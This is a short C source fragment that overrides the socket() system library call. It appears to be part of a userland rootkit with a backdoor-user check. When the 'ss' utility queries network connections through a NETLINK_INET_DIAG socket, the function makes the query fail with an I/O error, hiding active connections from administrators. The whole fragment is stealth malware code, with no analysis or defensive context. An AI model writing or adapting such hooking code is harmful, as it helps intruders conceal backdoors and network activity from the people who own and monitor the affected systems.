int socket(int domain, int type, int protocol){
    if(is_bdusr()) goto o_socket;

    if(domain == AF_NETLINK && protocol == NETLINK_INET_DIAG &&
        (cmp_process("ss") ||
        cmp_process("/usr/sbin/ss") ||
        cmp_process("/bin/ss"))){
        errno = EIO;
        return -1;
    }
o_socket:
    hook(CSOCKET);
    return (long)call(CSOCKET, domain, type, protocol);
}